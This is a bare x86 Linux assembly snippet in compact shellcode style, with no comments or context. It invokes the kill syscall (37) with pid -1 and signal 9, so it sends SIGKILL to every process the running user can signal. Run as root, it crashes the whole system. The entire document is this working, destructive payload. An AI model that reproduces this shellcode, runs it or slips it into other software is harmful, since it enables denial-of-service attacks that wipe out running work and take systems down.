section .text  
global _start  
_start: 
    xor ecx, ecx
    mul ecx
    xor ebx,ebx
    dec ebx
    mov al, 37 
    mov cl, 9
    int 0x80  
